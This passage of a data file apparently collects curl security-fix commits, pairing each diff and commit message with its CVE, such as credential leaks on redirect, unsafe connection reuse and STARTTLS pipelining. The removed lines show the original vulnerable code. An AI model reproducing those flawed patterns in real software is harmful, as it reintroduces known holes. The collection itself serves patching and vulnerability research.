    \ SSL_SET_OPTION(password))) {\n+    if(!SSL_CTX_set_srp_password(backend->ctx,\
    \ ssl_password)) {\n       failf(data, \"failed setting SRP password\");\n   \
    \    return CURLE_BAD_FUNCTION_ARGUMENT;\n     }"
  - "--- a/lib/vtls/vtls.c\n+++ b/lib/vtls/vtls.c\n@@ -132,6 +132,7 @@ Curl_ssl_config_matches(struct\
    \ ssl_primary_config *data,\n {\n   if((data->version == needle->version) &&\n\
    \      (data->version_max == needle->version_max) &&\n+     (data->ssl_options\
    \ == needle->ssl_options) &&\n      (data->verifypeer == needle->verifypeer) &&\n\
    \      (data->verifyhost == needle->verifyhost) &&\n      (data->verifystatus\
    \ == needle->verifystatus) &&\n@@ -144,9 +145,15 @@ Curl_ssl_config_matches(struct\
    \ ssl_primary_config *data,\n      Curl_safecmp(data->clientcert, needle->clientcert)\
    \ &&\n      Curl_safecmp(data->random_file, needle->random_file) &&\n      Curl_safecmp(data->egdsocket,\
    \ needle->egdsocket) &&\n+#ifdef USE_TLS_SRP\n+     Curl_safecmp(data->username,\
    \ needle->username) &&\n+     Curl_safecmp(data->password, needle->password) &&\n\
    +     (data->authtype == needle->authtype) &&\n+#endif\n      Curl_safe_strcasecompare(data->cipher_list,\
    \ needle->cipher_list) &&\n      Curl_safe_strcasecompare(data->cipher_list13,\
    \ needle->cipher_list13) &&\n      Curl_safe_strcasecompare(data->curves, needle->curves)\
    \ &&\n+     Curl_safe_strcasecompare(data->CRLfile, needle->CRLfile) &&\n    \
    \  Curl_safe_strcasecompare(data->pinned_key, needle->pinned_key))\n     return\
    \ TRUE;\n \n@@ -163,6 +170,10 @@ Curl_clone_primary_ssl_config(struct ssl_primary_config\
    \ *source,\n   dest->verifyhost = source->verifyhost;\n   dest->verifystatus =\
    \ source->verifystatus;\n   dest->sessionid = source->sessionid;\n+  dest->ssl_options\
    \ = source->ssl_options;\n+#ifdef USE_TLS_SRP\n+  dest->authtype = source->authtype;\n\
    +#endif\n \n   CLONE_BLOB(cert_blob);\n   CLONE_BLOB(ca_info_blob);\n@@ -177,6\
    \ +188,11 @@ Curl_clone_primary_ssl_config(struct ssl_primary_config *source,\n\
    \   CLONE_STRING(cipher_list13);\n   CLONE_STRING(pinned_key);\n   CLONE_STRING(curves);\n\
    +  CLONE_STRING(CRLfile);\n+#ifdef USE_TLS_SRP\n+  CLONE_STRING(username);\n+\
    \  CLONE_STRING(password);\n+#endif\n \n   return TRUE;\n }\n@@ -196,6 +212,11\
    \ @@ void Curl_free_primary_ssl_config(struct ssl_primary_config *sslc)\n   Curl_safefree(sslc->ca_info_blob);\n\
    \   Curl_safefree(sslc->issuercert_blob);\n   Curl_safefree(sslc->curves);\n+\
    \  Curl_safefree(sslc->CRLfile);\n+#ifdef USE_TLS_SRP\n+  Curl_safefree(sslc->username);\n\
    +  Curl_safefree(sslc->password);\n+#endif\n }\n \n #ifdef USE_SSL"
  commit_message: 'tls: check more TLS details for connection reuse


    CVE-2022-27782


    Reported-by: Harry Sintonen

    Bug: https://curl.se/docs/CVE-2022-27782.html

    Closes #8825'
  commit_sha: f18af4f874cecab82a9797e8c7541e0990c7a64c
  repo_name: curl/curl
- commit_diff:
  - "--- a/lib/cookie.c\n+++ b/lib/cookie.c\n@@ -427,7 +427,15 @@ static void remove_expired(struct\
    \ CookieInfo *cookies)\n /* Make sure domain contains a dot or is localhost. */\n\
    \ static bool bad_domain(const char *domain)\n {\n-  return !strchr(domain, '.')\
    \ && !strcasecompare(domain, \"localhost\");\n+  if(strcasecompare(domain, \"\
    localhost\"))\n+    return FALSE;\n+  else {\n+    /* there must be a dot present,\
    \ but that dot must not be a trailing dot */\n+    char *dot = strchr(domain,\
    \ '.');\n+    if(dot)\n+      return dot[1] ? FALSE : TRUE;\n+  }\n+  return TRUE;\n\
    \ }\n \n /*"
  commit_message: 'cookies: make bad_domain() not consider a trailing dot fine


    The check for a dot in the domain must not consider a single trailing

    dot to be fine, as then TLD + trailing dot is fine and curl will accept

    setting cookies for it.


    CVE-2022-27779


    Reported-by: Axel Chong

    Bug: https://curl.se/docs/CVE-2022-27779.html

    Closes #8820'
  commit_sha: 7e92d12b4e6911f424678a133b19de670e183a59
  repo_name: curl/curl
- commit_diff:
  - "--- a/src/tool_operate.c\n+++ b/src/tool_operate.c\n@@ -596,8 +596,8 @@ static\
    \ CURLcode post_per_transfer(struct GlobalConfig *global,\n         fprintf(global->errors,\
    \ \"curl: (%d) Failed writing body\\n\", result);\n     }\n     if(result && config->rm_partial)\
    \ {\n-      notef(global, \"Removing output file: %s\", per->outfile);\n-    \
    \  unlink(per->outfile);\n+      notef(global, \"Removing output file: %s\\n\"\
    , outs->filename);\n+      unlink(outs->filename);\n     }\n   }\n "
  commit_message: 'post_per_transfer: remove the updated file name


    When --remove-on-error is used with --no-clobber, it might have an

    updated file name to remove.


    Bug: https://curl.se/docs/CVE-2022-27778.html


    CVE-2022-27778


    Reported-by: Harry Sintonen


    Closes #8824'
  commit_sha: 8c7ee9083d0d719d0a77ab20d9cc2ae84eeea7f3
  repo_name: curl/curl
- commit_diff:
  - "--- a/lib/hsts.c\n+++ b/lib/hsts.c\n@@ -114,16 +114,25 @@ static CURLcode hsts_create(struct\
    \ hsts *h,\n                             curl_off_t expires)\n {\n   struct stsentry\
    \ *sts = hsts_entry();\n+  char *duphost;\n+  size_t hlen;\n   if(!sts)\n    \
    \ return CURLE_OUT_OF_MEMORY;\n \n-  sts->expires = expires;\n-  sts->includeSubDomains\
    \ = subdomains;\n-  sts->host = strdup(hostname);\n-  if(!sts->host) {\n+  duphost\
    \ = strdup(hostname);\n+  if(!duphost) {\n     free(sts);\n     return CURLE_OUT_OF_MEMORY;\n\
    \   }\n+\n+  hlen = strlen(duphost);\n+  if(duphost[hlen - 1] == '.')\n+    /*\
    \ strip off trailing any dot */\n+    duphost[--hlen] = 0;\n+\n+  sts->host =\
    \ duphost;\n+  sts->expires = expires;\n+  sts->includeSubDomains = subdomains;\n\
    \   Curl_llist_insert_next(&h->list, h->list.tail, sts, &sts->node);\n   return\
    \ CURLE_OK;\n }\n@@ -238,10 +247,21 @@ struct stsentry *Curl_hsts(struct hsts\
    \ *h, const char *hostname,\n                            bool subdomain)\n {\n\
    \   if(h) {\n+    char buffer[MAX_HSTS_HOSTLEN + 1];\n     time_t now = time(NULL);\n\
    \     size_t hlen = strlen(hostname);\n     struct Curl_llist_element *e;\n  \
    \   struct Curl_llist_element *n;\n+\n+    if((hlen > MAX_HSTS_HOSTLEN) || !hlen)\n\
    +      return NULL;\n+    memcpy(buffer, hostname, hlen);\n+    if(hostname[hlen-1]\
    \ == '.')\n+      /* remove the trailing dot */\n+      --hlen;\n+    buffer[hlen]\
    \ = 0;\n+    hostname = buffer;\n+\n     for(e = h->list.head; e; e = n) {\n \
    \      struct stsentry *sts = e->ptr;\n       n = e->next;\n@@ -440,7 +460,7 @@\
    \ static CURLcode hsts_pull(struct Curl_easy *data, struct hsts *h)\n     CURLSTScode\
    \ sc;\n     DEBUGASSERT(h);\n     do {\n-      char buffer[257];\n+      char\
    \ buffer[MAX_HSTS_HOSTLEN + 1];\n       struct curl_hstsentry e;\n       e.name\
    \ = buffer;\n       e.namelen = sizeof(buffer)-1;"
  commit_message: 'hsts: ignore trailing dots when comparing hosts names


    CVE-2022-30115


    Reported-by: Axel Chong

    Bug: https://curl.se/docs/CVE-2022-30115.html

    Closes #8821'
  commit_sha: fae6fea209a2d4db1582f608bd8cc8000721733a
  repo_name: curl/curl
- commit_diff:
  - "--- a/lib/urlapi.c\n+++ b/lib/urlapi.c\n@@ -678,8 +678,8 @@ static CURLUcode\
    \ hostname_check(struct Curl_URL *u, char *hostname)\n #endif\n   }\n   else {\n\
    -    /* letters from the second string is not ok */\n-    len = strcspn(hostname,\
    \ \" \\r\\n\");\n+    /* letters from the second string are not ok */\n+    len\
    \ = strcspn(hostname, \" \\r\\n\\t/:#?!@\");\n     if(hlen != len)\n       /*\
    \ hostname with bad content */\n       return CURLUE_BAD_HOSTNAME;"
  commit_message: 'urlapi: reject percent-decoding host name into separator bytes


    CVE-2022-27780


    Reported-by: Axel Chong

    Bug: https://curl.se/docs/CVE-2022-27780.html

    Closes #8826'
  commit_sha: 914aaab9153764ef8fa4178215b8ad89d3ac263a
  repo_name: curl/curl
- commit_diff:
  - "--- a/lib/vtls/nss.c\n+++ b/lib/vtls/nss.c\n@@ -983,6 +983,9 @@ static void display_cert_info(struct\
    \ Curl_easy *data,\n   PR_Free(common_name);\n }\n \n+/* A number of certs that\
    \ will never occur in a real server handshake */\n+#define TOO_MANY_CERTS 300\n\
    +\n static CURLcode display_conn_info(struct Curl_easy *data, PRFileDesc *sock)\n\
    \ {\n   CURLcode result = CURLE_OK;\n@@ -1018,6 +1021,11 @@ static CURLcode display_conn_info(struct\
    \ Curl_easy *data, PRFileDesc *sock)\n         cert2 = CERT_FindCertIssuer(cert,\
    \ now, certUsageSSLCA);\n         while(cert2) {\n           i++;\n+         \
    \ if(i >= TOO_MANY_CERTS) {\n+            CERT_DestroyCertificate(cert2);\n+ \
    \           failf(data, \"certificate loop\");\n+            return CURLE_SSL_CERTPROBLEM;\n\
    +          }\n           if(cert2->isRoot) {\n             CERT_DestroyCertificate(cert2);\n\
    \             break;"
  commit_message: "nss: return error if seemingly stuck in a cert loop\n\nCVE-2022-27781\n\
    \nReported-by: Florian Kohnh\xE4user\nBug: https://curl.se/docs/CVE-2022-27781.html\n\
    Closes #8822"
  commit_sha: 5c7da89d404bf59c8dd82a001119a16d18365917
  repo_name: curl/curl
- commit_diff:
  - "--- a/lib/transfer.c\n+++ b/lib/transfer.c\n@@ -1611,10 +1611,57 @@ CURLcode\
    \ Curl_follow(struct Curl_easy *data,\n       return CURLE_OUT_OF_MEMORY;\n  \
    \ }\n   else {\n-\n     uc = curl_url_get(data->state.uh, CURLUPART_URL, &newurl,\
    \ 0);\n     if(uc)\n       return Curl_uc_to_curlcode(uc);\n+\n+    /* Clear auth\
    \ if this redirects to a different port number or protocol,\n+       unless permitted\
    \ */\n+    if(!data->set.allow_auth_to_other_hosts && (type != FOLLOW_FAKE)) {\n\
    +      char *portnum;\n+      int port;\n+      bool clear = FALSE;\n+\n+    \
    \  if(data->set.use_port && data->state.allow_port)\n+        /* a custom port\
    \ is used */\n+        port = (int)data->set.use_port;\n+      else {\n+     \
    \   uc = curl_url_get(data->state.uh, CURLUPART_PORT, &portnum,\n+           \
    \               CURLU_DEFAULT_PORT);\n+        if(uc) {\n+          free(newurl);\n\
    +          return Curl_uc_to_curlcode(uc);\n+        }\n+        port = atoi(portnum);\n\
    +        free(portnum);\n+      }\n+      if(port != data->info.conn_remote_port)\
    \ {\n+        infof(data, \"Clear auth, redirects to port from %u to %u\",\n+\
    \              data->info.conn_remote_port, port);\n+        clear = TRUE;\n+\
    \      }\n+      else {\n+        char *scheme;\n+        const struct Curl_handler\
    \ *p;\n+        uc = curl_url_get(data->state.uh, CURLUPART_SCHEME, &scheme, 0);\n\
    +        if(uc) {\n+          free(newurl);\n+          return Curl_uc_to_curlcode(uc);\n\
    +        }\n+\n+        p = Curl_builtin_scheme(scheme);\n+        if(p && (p->protocol\
    \ != data->info.conn_protocol)) {\n+          infof(data, \"Clear auth, redirects\
    \ scheme from %s to %s\",\n+                data->info.conn_scheme, scheme);\n\
    +          clear = TRUE;\n+        }\n+        free(scheme);\n+      }\n+    \
    \  if(clear) {\n+        Curl_safefree(data->state.aptr.user);\n+        Curl_safefree(data->state.aptr.passwd);\n\
    +      }\n+    }\n   }\n \n   if(type == FOLLOW_FAKE) {"
  commit_message: 'transfer: redirects to other protocols or ports clear auth


    ... unless explicitly permitted.


    Bug: https://curl.se/docs/CVE-2022-27774.html

    Reported-by: Harry Sintonen

    Closes #8748'
  commit_sha: 620ea21410030a9977396b4661806bc187231b79
  repo_name: curl/curl
- commit_diff:
  - "--- a/lib/http.c\n+++ b/lib/http.c\n@@ -775,6 +775,21 @@ output_auth_headers(struct\
    \ Curl_easy *data,\n   return CURLE_OK;\n }\n \n+/*\n+ * allow_auth_to_host()\
    \ tells if autentication, cookies or other \"sensitive\n+ * data\" can (still)\
    \ be sent to this host.\n+ */\n+static bool allow_auth_to_host(struct Curl_easy\
    \ *data)\n+{\n+  struct connectdata *conn = data->conn;\n+  return (!data->state.this_is_a_follow\
    \ ||\n+          data->set.allow_auth_to_other_hosts ||\n+          (data->state.first_host\
    \ &&\n+           strcasecompare(data->state.first_host, conn->host.name) &&\n\
    +           (data->state.first_remote_port == conn->remote_port) &&\n+       \
    \    (data->state.first_remote_protocol == conn->handler->protocol)));\n+}\n+\n\
    \ /**\n  * Curl_http_output_auth() setups the authentication headers for the\n\
    \  * host/proxy and the correct authentication\n@@ -847,17 +862,14 @@ Curl_http_output_auth(struct\
    \ Curl_easy *data,\n        with it */\n     authproxy->done = TRUE;\n \n-  /*\
    \ To prevent the user+password to get sent to other than the original\n-     host\
    \ due to a location-follow, we do some weirdo checks here */\n-  if(!data->state.this_is_a_follow\
    \ ||\n+  /* To prevent the user+password to get sent to other than the original\
    \ host\n+     due to a location-follow */\n+  if(allow_auth_to_host(data)\n #ifndef\
    \ CURL_DISABLE_NETRC\n-     conn->bits.netrc ||\n+     || conn->bits.netrc\n #endif\n\
    -     !data->state.first_host ||\n-     data->set.allow_auth_to_other_hosts ||\n\
    -     strcasecompare(data->state.first_host, conn->host.name)) {\n+    )\n   \
    \  result = output_auth_headers(data, conn, authhost, request, path, FALSE);\n\
    -  }\n   else\n     authhost->done = TRUE;\n \n@@ -1905,10 +1917,7 @@ CURLcode\
    \ Curl_add_custom_headers(struct Curl_easy *data,\n                    checkprefix(\"\
    Cookie:\", compare)) &&\n                   /* be careful of sending this potentially\
    \ sensitive header to\n                      other hosts */\n-               \
    \   (data->state.this_is_a_follow &&\n-                   data->state.first_host\
    \ &&\n-                   !data->set.allow_auth_to_other_hosts &&\n-         \
    \          !strcasecompare(data->state.first_host, conn->host.name)))\n+     \
    \             !allow_auth_to_host(data))\n             ;\n           else {\n\
    \ #ifdef USE_HYPER\n@@ -2084,6 +2093,7 @@ CURLcode Curl_http_host(struct Curl_easy\
    \ *data, struct connectdata *conn)\n       return CURLE_OUT_OF_MEMORY;\n \n  \
    \   data->state.first_remote_port = conn->remote_port;\n+    data->state.first_remote_protocol\
    \ = conn->handler->protocol;\n   }\n   Curl_safefree(data->state.aptr.host);\n\
    \ "
  commit_message: 'http: avoid auth/cookie on redirects same host diff port


    CVE-2022-27776


    Reported-by: Harry Sintonen

    Bug: https://curl.se/docs/CVE-2022-27776.html

    Closes #8749'
  commit_sha: 6e659993952aa5f90f48864be84a1bbb047fc258
  repo_name: curl/curl
- commit_diff:
  - "--- a/lib/conncache.c\n+++ b/lib/conncache.c\n@@ -155,8 +155,12 @@ static void\
    \ hashkey(struct connectdata *conn, char *buf,\n     /* report back which name\
    \ we used */\n     *hostp = hostname;\n \n-  /* put the number first so that the\
    \ hostname gets cut off if too long */\n-  msnprintf(buf, len, \"%ld%s\", port,\
    \ hostname);\n+  /* put the numbers first so that the hostname gets cut off if\
    \ too long */\n+#ifdef ENABLE_IPV6\n+  msnprintf(buf, len, \"%u/%ld/%s\", conn->scope_id,\
    \ port, hostname);\n+#else\n+  msnprintf(buf, len, \"%ld/%s\", port, hostname);\n\
    +#endif\n   Curl_strntolower(buf, buf, len);\n }\n "
  commit_message: 'conncache: include the zone id in the "bundle" hashkey


    Make connections to two separate IPv6 zone ids create separate

    connections.


    Reported-by: Harry Sintonen

    Bug: https://curl.se/docs/CVE-2022-27775.html

    Closes #8747'
  commit_sha: 058f98dc3fe595f21dc26a5b9b1699e519ba5705
  repo_name: curl/curl
- commit_diff:
  - "--- a/lib/strcase.c\n+++ b/lib/strcase.c\n@@ -131,6 +131,16 @@ void Curl_strntolower(char\
    \ *dest, const char *src, size_t n)\n   } while(*src++ && --n);\n }\n \n+/* Compare\
    \ case-sensitive NUL-terminated strings, taking care of possible\n+ * null pointers.\
    \ Return true if arguments match.\n+ */\n+bool Curl_safecmp(char *a, char *b)\n\
    +{\n+  if(a && b)\n+    return !strcmp(a, b);\n+  return !a && !b;\n+}\n+\n /*\
    \ --- public functions --- */\n \n int curl_strequal(const char *first, const\
    \ char *second)"
  - "--- a/lib/url.c\n+++ b/lib/url.c\n@@ -781,6 +781,7 @@ static void conn_free(struct\
    \ connectdata *conn)\n   Curl_safefree(conn->passwd);\n   Curl_safefree(conn->sasl_authzid);\n\
    \   Curl_safefree(conn->options);\n+  Curl_safefree(conn->oauth_bearer);\n   Curl_dyn_free(&conn->trailer);\n\
    \   Curl_safefree(conn->host.rawalloc); /* host name buffer */\n   Curl_safefree(conn->conn_to_host.rawalloc);\
    \ /* host name buffer */\n@@ -1342,7 +1343,9 @@ ConnectionExists(struct Curl_easy\
    \ *data,\n         /* This protocol requires credentials per connection,\n   \
    \         so verify that we're using the same name and password as well */\n \
    \        if(strcmp(needle->user, check->user) ||\n-           strcmp(needle->passwd,\
    \ check->passwd)) {\n+           strcmp(needle->passwd, check->passwd) ||\n+ \
    \          !Curl_safecmp(needle->sasl_authzid, check->sasl_authzid) ||\n+    \
    \       !Curl_safecmp(needle->oauth_bearer, check->oauth_bearer)) {\n        \
    \   /* one of them was different */\n           continue;\n         }\n@@ -3637,6\
    \ +3640,14 @@ static CURLcode create_conn(struct Curl_easy *data,\n     }\n  \
    \ }\n \n+  if(data->set.str[STRING_BEARER]) {\n+    conn->oauth_bearer = strdup(data->set.str[STRING_BEARER]);\n\
    +    if(!conn->oauth_bearer) {\n+      result = CURLE_OUT_OF_MEMORY;\n+      goto\
    \ out;\n+    }\n+  }\n+\n #ifdef USE_UNIX_SOCKETS\n   if(data->set.str[STRING_UNIX_SOCKET_PATH])\
    \ {\n     conn->unix_domain_socket = strdup(data->set.str[STRING_UNIX_SOCKET_PATH]);"
  - "--- a/lib/vtls/vtls.c\n+++ b/lib/vtls/vtls.c\n@@ -125,15 +125,6 @@ static bool\
    \ blobcmp(struct curl_blob *first, struct curl_blob *second)\n   return !memcmp(first->data,\
    \ second->data, first->len); /* same data */\n }\n \n-static bool safecmp(char\
    \ *a, char *b)\n-{\n-  if(a && b)\n-    return !strcmp(a, b);\n-  else if(!a &&\
    \ !b)\n-    return TRUE; /* match */\n-  return FALSE; /* no match */\n-}\n-\n\
    \ \n bool\n Curl_ssl_config_matches(struct ssl_primary_config *data,\n@@ -147,12\
    \ +138,12 @@ Curl_ssl_config_matches(struct ssl_primary_config *data,\n      blobcmp(data->cert_blob,\
    \ needle->cert_blob) &&\n      blobcmp(data->ca_info_blob, needle->ca_info_blob)\
    \ &&\n      blobcmp(data->issuercert_blob, needle->issuercert_blob) &&\n-    \
    \ safecmp(data->CApath, needle->CApath) &&\n-     safecmp(data->CAfile, needle->CAfile)\
    \ &&\n-     safecmp(data->issuercert, needle->issuercert) &&\n-     safecmp(data->clientcert,\
    \ needle->clientcert) &&\n-     safecmp(data->random_file, needle->random_file)\
    \ &&\n-     safecmp(data->egdsocket, needle->egdsocket) &&\n+     Curl_safecmp(data->CApath,\
    \ needle->CApath) &&\n+     Curl_safecmp(data->CAfile, needle->CAfile) &&\n+ \
    \    Curl_safecmp(data->issuercert, needle->issuercert) &&\n+     Curl_safecmp(data->clientcert,\
    \ needle->clientcert) &&\n+     Curl_safecmp(data->random_file, needle->random_file)\
    \ &&\n+     Curl_safecmp(data->egdsocket, needle->egdsocket) &&\n      Curl_safe_strcasecompare(data->cipher_list,\
    \ needle->cipher_list) &&\n      Curl_safe_strcasecompare(data->cipher_list13,\
    \ needle->cipher_list13) &&\n      Curl_safe_strcasecompare(data->curves, needle->curves)\
    \ &&"
  commit_message: 'url: check sasl additional parameters for connection reuse.


    Also move static function safecmp() as non-static Curl_safecmp() since

    its purpose is needed at several places.


    Bug: https://curl.se/docs/CVE-2022-22576.html


    CVE-2022-22576


    Closes #8746'
  commit_sha: 852aa5ad351ea53e5f01d2f44b5b4370c2bf5425
  repo_name: curl/curl
- commit_diff:
  - "--- a/lib/multi.c\n+++ b/lib/multi.c\n@@ -703,14 +703,15 @@ static CURLcode multi_done(struct\
    \ Curl_easy *data,\n       conn->bits.conn_to_host ? conn->conn_to_host.dispname\
    \ :\n       conn->host.dispname;\n     /* create string before returning the connection\
    \ */\n+    long connection_id = conn->connection_id;\n     msnprintf(buffer, sizeof(buffer),\n\
    \               \"Connection #%ld to host %s left intact\",\n-              conn->connection_id,\
    \ host);\n+              connection_id, host);\n     /* the connection is no longer\
    \ in use by this transfer */\n     CONNCACHE_UNLOCK(data);\n     if(Curl_conncache_return_conn(data,\
    \ conn)) {\n       /* remember the most recently used connection */\n-      data->state.lastconnect_id\
    \ = conn->connection_id;\n+      data->state.lastconnect_id = connection_id;\n\
    \       infof(data, \"%s\", buffer);\n     }\n     else"
  commit_message: 'multi: remember connection_id before returning connection to pool


    Fix a bug that does not require a new CVE as discussed on hackerone.com.

    Previously `connection_id` was accessed after returning connection to

    the shared pool.


    Bug: https://hackerone.com/reports/1463013

    Closes #8355'
  commit_sha: 3c798b1db35890801877f08812c30fdbf7ededdd
  repo_name: curl/curl
- commit_diff:
  - "--- a/lib/ftp.c\n+++ b/lib/ftp.c\n@@ -2743,6 +2743,9 @@ static CURLcode ftp_statemachine(struct\
    \ Curl_easy *data,\n     case FTP_AUTH:\n       /* we have gotten the response\
    \ to a previous AUTH command */\n \n+      if(pp->cache_size)\n+        return\
    \ CURLE_WEIRD_SERVER_REPLY; /* Forbid pipelining in response. */\n+\n       /*\
    \ RFC2228 (page 5) says:\n        *\n        * If the server is willing to accept\
    \ the named security mechanism,"
  - "--- a/lib/imap.c\n+++ b/lib/imap.c\n@@ -963,6 +963,10 @@ static CURLcode imap_state_starttls_resp(struct\
    \ Curl_easy *data,\n \n   (void)instate; /* no use for this yet */\n \n+  /* Pipelining\
    \ in response is forbidden. */\n+  if(data->conn->proto.imapc.pp.cache_size)\n\
    +    return CURLE_WEIRD_SERVER_REPLY;\n+\n   if(imapcode != IMAP_RESP_OK) {\n\
    \     if(data->set.use_ssl != CURLUSESSL_TRY) {\n       failf(data, \"STARTTLS\
    \ denied\");"
  - "--- a/lib/pop3.c\n+++ b/lib/pop3.c\n@@ -771,6 +771,10 @@ static CURLcode pop3_state_starttls_resp(struct\
    \ Curl_easy *data,\n   CURLcode result = CURLE_OK;\n   (void)instate; /* no use\
    \ for this yet */\n \n+  /* Pipelining in response is forbidden. */\n+  if(data->conn->proto.pop3c.pp.cache_size)\n\
    +    return CURLE_WEIRD_SERVER_REPLY;\n+\n   if(pop3code != '+') {\n     if(data->set.use_ssl\
    \ != CURLUSESSL_TRY) {\n       failf(data, \"STARTTLS denied\");"
  - "--- a/lib/smtp.c\n+++ b/lib/smtp.c\n@@ -834,6 +834,10 @@ static CURLcode smtp_state_starttls_resp(struct\
    \ Curl_easy *data,\n   CURLcode result = CURLE_OK;\n   (void)instate; /* no use\
    \ for this yet */\n \n+  /* Pipelining in response is forbidden. */\n+  if(data->conn->proto.smtpc.pp.cache_size)\n\
    +    return CURLE_WEIRD_SERVER_REPLY;\n+\n   if(smtpcode != 220) {\n     if(data->set.use_ssl\
    \ != CURLUSESSL_TRY) {\n       failf(data, \"STARTTLS denied, code %d\", smtpcode);"
  commit_message: 'ftp,imap,pop3,smtp: reject STARTTLS server response pipelining


    If a server pipelines future responses within the STARTTLS response, the

    former are preserved in the pingpong cache across TLS negotiation and

    used as responses to the encrypted commands.


    This fix detects pipelined STARTTLS responses and rejects them with an

    error.


    CVE-2021-22947


    Bug: https://curl.se/docs/CVE-2021-22947.html'
  commit_sha: 8ef147c43646e91fdaad5d0e7b60351f842e5c68
  repo_name: curl/curl
- commit_diff:
  - "--- a/lib/ftp.c\n+++ b/lib/ftp.c\n@@ -2681,9 +2681,12 @@ static CURLcode ftp_statemachine(struct\
    \ Curl_easy *data,\n     /* we have now received a full FTP server response */\n\
    \     switch(ftpc->state) {\n     case FTP_WAIT220:\n-      if(ftpcode == 230)\n\
    -        /* 230 User logged in - already! */\n-        return ftp_state_user_resp(data,\
    \ ftpcode, ftpc->state);\n+      if(ftpcode == 230) {\n+        /* 230 User logged\
    \ in - already! Take as 220 if TLS required. */\n+        if(data->set.use_ssl\
    \ <= CURLUSESSL_TRY ||\n+           conn->bits.ftp_use_control_ssl)\n+       \
    \   return ftp_state_user_resp(data, ftpcode, ftpc->state);\n+      }\n      \
    \ else if(ftpcode != 220) {\n         failf(data, \"Got a %03d ftp-server response\
    \ when 220 was expected\",\n               ftpcode);"
  - "--- a/lib/imap.c\n+++ b/lib/imap.c\n@@ -934,22 +934,18 @@ static CURLcode imap_state_capability_resp(struct\
    \ Curl_easy *data,\n       line += wordlen;\n     }\n   }\n-  else if(imapcode\
    \ == IMAP_RESP_OK) {\n-    if(data->set.use_ssl && !conn->ssl[FIRSTSOCKET].use)\
    \ {\n-      /* We don't have a SSL/TLS connection yet, but SSL is requested */\n\
    -      if(imapc->tls_supported)\n-        /* Switch to TLS connection now */\n\
    -        result = imap_perform_starttls(data, conn);\n-      else if(data->set.use_ssl\
    \ == CURLUSESSL_TRY)\n-        /* Fallback and carry on with authentication */\n\
    -        result = imap_perform_authentication(data, conn);\n-      else {\n- \
    \       failf(data, \"STARTTLS not supported.\");\n-        result = CURLE_USE_SSL_FAILED;\n\
    -      }\n+  else if(data->set.use_ssl && !conn->ssl[FIRSTSOCKET].use) {\n+  \
    \  /* PREAUTH is not compatible with STARTTLS. */\n+    if(imapcode == IMAP_RESP_OK\
    \ && imapc->tls_supported && !imapc->preauth) {\n+      /* Switch to TLS connection\
    \ now */\n+      result = imap_perform_starttls(data, conn);\n     }\n-    else\n\
    +    else if(data->set.use_ssl <= CURLUSESSL_TRY)\n       result = imap_perform_authentication(data,\
    \ conn);\n+    else {\n+      failf(data, \"STARTTLS not available.\");\n+   \
    \   result = CURLE_USE_SSL_FAILED;\n+    }\n   }\n   else\n     result = imap_perform_authentication(data,\
    \ conn);"
  - "--- a/lib/pop3.c\n+++ b/lib/pop3.c\n@@ -740,28 +740,23 @@ static CURLcode pop3_state_capa_resp(struct\
    \ Curl_easy *data, int pop3code,\n       }\n     }\n   }\n-  else if(pop3code\
    \ == '+') {\n-    if(data->set.use_ssl && !conn->ssl[FIRSTSOCKET].use) {\n-  \
    \    /* We don't have a SSL/TLS connection yet, but SSL is requested */\n-   \
    \   if(pop3c->tls_supported)\n-        /* Switch to TLS connection now */\n- \
    \       result = pop3_perform_starttls(data, conn);\n-      else if(data->set.use_ssl\
    \ == CURLUSESSL_TRY)\n-        /* Fallback and carry on with authentication */\n\
    -        result = pop3_perform_authentication(data, conn);\n-      else {\n- \
    \       failf(data, \"STLS not supported.\");\n-        result = CURLE_USE_SSL_FAILED;\n\
    -      }\n-    }\n-    else\n-      result = pop3_perform_authentication(data,\
    \ conn);\n-  }\n   else {\n     /* Clear text is supported when CAPA isn't recognised\
    \ */\n-    pop3c->authtypes |= POP3_TYPE_CLEARTEXT;\n+    if(pop3code != '+')\n\
    +      pop3c->authtypes |= POP3_TYPE_CLEARTEXT;\n \n-    result = pop3_perform_authentication(data,\
    \ conn);\n+    if(!data->set.use_ssl || conn->ssl[FIRSTSOCKET].use)\n+      result\
    \ = pop3_perform_authentication(data, conn);\n+    else if(pop3code == '+' &&\
    \ pop3c->tls_supported)\n+      /* Switch to TLS connection now */\n+      result\
    \ = pop3_perform_starttls(data, conn);\n+    else if(data->set.use_ssl <= CURLUSESSL_TRY)\n\
    +      /* Fallback and carry on with authentication */\n+      result = pop3_perform_authentication(data,\
    \ conn);\n+    else {\n+      failf(data, \"STLS not supported.\");\n+      result\
    \ = CURLE_USE_SSL_FAILED;\n+    }\n   }\n \n   return result;"
  commit_message: 'ftp,imap,pop3: do not ignore --ssl-reqd


    In imap and pop3, check if TLS is required even when capabilities

    request has failed.


    In ftp, ignore preauthentication (230 status of server greeting) if TLS

    is required.


    Bug: https://curl.se/docs/CVE-2021-22946.html


    CVE-2021-22946'
  commit_sha: 364f174724ef115c63d5e5dc1d3342c8a43b1cca
  repo_name: curl/curl
- commit_diff:
  - "--- a/lib/mqtt.c\n+++ b/lib/mqtt.c\n@@ -128,6 +128,10 @@ static CURLcode mqtt_send(struct\
    \ Curl_easy *data,\n     mq->sendleftovers = sendleftovers;\n     mq->nsend =\
    \ nsend;\n   }\n+  else {\n+    mq->sendleftovers = NULL;\n+    mq->nsend = 0;\n\
    +  }\n   return result;\n }\n "
  commit_message: 'mqtt: clear the leftovers pointer when sending succeeds


    CVE-2021-22945


    Bug: https://curl.se/docs/CVE-2021-22945.html'
  commit_sha: 43157490a5054bd24256fe12876931e8abc9df49
  repo_name: curl/curl
- commit_diff:
  - "--- a/lib/url.c\n+++ b/lib/url.c\n@@ -3761,6 +3761,8 @@ static CURLcode create_conn(struct\
    \ Curl_easy *data,\n   */\n   data->set.ssl.primary.CApath = data->set.str[STRING_SSL_CAPATH];\n\
    \   data->set.ssl.primary.CAfile = data->set.str[STRING_SSL_CAFILE];\n+  data->set.ssl.primary.issuercert\
    \ = data->set.str[STRING_SSL_ISSUERCERT];\n+  data->set.ssl.primary.issuercert_blob\
    \ = data->set.blobs[BLOB_SSL_ISSUERCERT];\n   data->set.ssl.primary.random_file\
    \ = data->set.str[STRING_SSL_RANDOM_FILE];\n   data->set.ssl.primary.egdsocket\
    \ = data->set.str[STRING_SSL_EGDSOCKET];\n   data->set.ssl.primary.cipher_list\
    \ =\n@@ -3788,8 +3790,11 @@ static CURLcode create_conn(struct Curl_easy *data,\n\
    \   data->set.proxy_ssl.primary.cert_blob = data->set.blobs[BLOB_CERT_PROXY];\n\
